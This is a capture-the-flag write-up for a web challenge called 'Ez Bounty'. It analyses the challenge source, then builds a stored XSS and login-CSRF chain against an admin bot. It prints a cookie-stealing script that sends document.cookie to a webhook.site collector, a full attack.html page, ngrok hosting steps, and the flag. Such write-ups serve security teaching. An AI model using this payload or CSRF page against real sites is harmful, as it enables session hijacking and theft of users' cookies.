# Ez Bounty

I found a bug on this platform and reported it on HackerOne but they told me it was out of scope. Could you help me get my money?

**Note: This challenge is solvable only with Chromium-based browsers. It is recommended to test your payloads on Chrome.**

{% file src="../../../.gitbook/assets/ezbounty.zip" %}

***

### Source Code Analysis

#### Key Observations

**1. Flag is stored in a cookie (JavaScript readable!)**

python

```python
await page.setCookie({
    "name": "flag",
    "value": FLAG,
    "httpOnly": False,   # ← JS can read this!
    "sameSite": "None",
    "secure": True
})
```

`httpOnly: False` means `document.cookie` in JavaScript can access the flag.

**2. Session Cookie is also JS readable**

python

```python
app.config.update(
    SESSION_COOKIE_SAMESITE="None",
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=False  # ← Session also readable!
)
```

**3. Admin Bot visits ANY URL we give it**

python

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        url = request.form.get("url")
        threading.Thread(target=run_bot, args=(url,)).start()
        return "Admin bot is visiting your URL..."
```

**4. No XSS sanitization on username field**

python

```python
conn.execute(
    "INSERT INTO users (username, password) VALUES (?, ?)",
    (username, password)
)
```

Username is stored raw — no HTML escaping. This means we can store JavaScript in the username!

### Vulnerability Chain

```
Stored XSS (username field)
        +
    CSRF (force bot to login as our user)
        +
Cookie Hijacking (steal flag via JS)
        =
        🏆 FLAG
```

***

### Exploitation

#### Step 1: Create XSS Account

Register a new account with a **malicious username**:

```
Username: <script>document.location='https://webhook.site/YOUR-ID/?c='+document.cookie</script>
Password: password123
```

When the dashboard renders this username, the browser will execute it as JavaScript and send all cookies to our webhook.

<figure><img src="../../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>

***

#### Step 2: Host Malicious HTML Page

Create `attack.html` with the following content:

html

```html
<html>
<body>
<script>
async function attack() {

    // Step 1: Logout the admin bot from its own session
    await fetch('https://TARGET_URL/logout', {
        mode: 'no-cors',
        credentials: 'include'
    });

    await new Promise(r => setTimeout(r, 1000));

    // Step 2: Login as our XSS user
    let form = new FormData();
    form.append('username', '<script>document.location=\'https://webhook.site/YOUR-ID/?c=\'+document.cookie<\/script>');
    form.append('password', 'password123');
    
    await fetch('https://TARGET_URL/login', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: form
    });

    await new Promise(r => setTimeout(r, 1500));

    // Step 3: Navigate to dashboard → XSS fires!
    window.location = 'https://TARGET_URL/dashboard';
}

attack();
</script>
</body>
</html>
```

Host it using Python + Ngrok:

```bash
# Terminal 1
python3 -m http.server 8080

# Terminal 2
ngrok http 8080
```

<figure><img src="../../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>

#### Step 3: Submit URL to /report

Go to `/report` and submit:

```
https://YOUR-NGROK-URL/attack.html
```

<figure><img src="../../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>

***

#### Step 4: Receive Flag on Webhook

Check your webhook listener at `https://webhook.site/YOUR-ID`

You will see a request like:

```
GET /?c=flag=KSUS{...}; session=...
```

<figure><img src="../../../.gitbook/assets/image (765).png" alt=""><figcaption></figcaption></figure>

```
Flag : KSUS{moneyless_iframe_baby}
```

